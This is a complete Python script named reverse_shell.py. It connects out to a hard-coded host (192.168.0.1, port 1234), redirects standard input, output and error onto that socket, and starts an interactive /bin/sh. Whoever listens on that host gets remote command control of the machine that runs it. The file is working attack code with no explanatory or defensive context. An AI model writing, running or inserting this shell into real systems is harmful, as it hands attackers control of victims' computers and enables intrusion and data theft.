# reverse_shell.py
import socket
import subprocess
import os

IP = "192.168.0.1"
PORT = 1234

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr

    subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    main()